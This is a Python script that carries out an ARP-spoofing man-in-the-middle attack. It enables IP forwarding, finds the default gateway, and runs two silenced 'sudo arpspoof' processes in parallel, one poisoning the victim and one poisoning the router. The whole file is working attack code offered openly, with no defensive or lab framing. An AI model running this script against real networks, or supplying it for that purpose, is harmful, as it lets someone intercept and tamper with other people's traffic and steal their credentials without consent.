import subprocess
import threading
import os


def enable_ip_forwarding():
    """
    Enables IP forwarding on Linux by writing to /proc/sys/net/ipv4/ip_forward.
    """
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1")
        print("[*] IP forwarding enabled.")
    except PermissionError:
        print("[!] Permission denied. Run this script with elevated privileges (sudo).")
    except Exception as e:
        print(f"[!] Failed to enable IP forwarding: {e}")


def perform_arp_spoof(victim_ip, iface="eth0"):
    enable_ip_forwarding()
    router_ip = subprocess.check_output(
        ["ip", "route"], encoding="utf-8").split("default via ")[1].split()[0]

    victim_thread = threading.Thread(
        target=run_arpspoof, args=(victim_ip, router_ip, iface, True))
    router_thread = threading.Thread(
        target=run_arpspoof, args=(victim_ip, router_ip, iface, False))

    victim_thread.start()
    router_thread.start()

    victim_thread.join()
    router_thread.join()


def run_arpspoof(victim_ip, router_ip, iface="eth0", target_victim=True):
    """
    Sends unsolicited ARP replies to either the victim or the router.
    """
    try:
        # Redirect output to DEVNULL to make the command silent
        with open(os.devnull, 'w') as devnull:
            if target_victim:
                # Step 1: Send ARP reply to the victim (spoofing the router)
                print(
                    f"[*] Sending ARP reply to victim {victim_ip} (pretending to be {router_ip}).")
                subprocess.run(["sudo", "arpspoof", "-i", iface, "-t", victim_ip, router_ip],
                               stdout=devnull, stderr=devnull, check=True)
            else:
                # Step 2: Send ARP reply to the router (spoofing the victim)
                print(
                    f"[*] Sending ARP reply to router {router_ip} (pretending to be {victim_ip}).")
                subprocess.run(["sudo", "arpspoof", "-i", iface, "-t", router_ip, victim_ip],
                               stdout=devnull, stderr=devnull, check=True)

    except subprocess.CalledProcessError as e:
        print(f"[!] Failed to execute arpspoof: {e}")
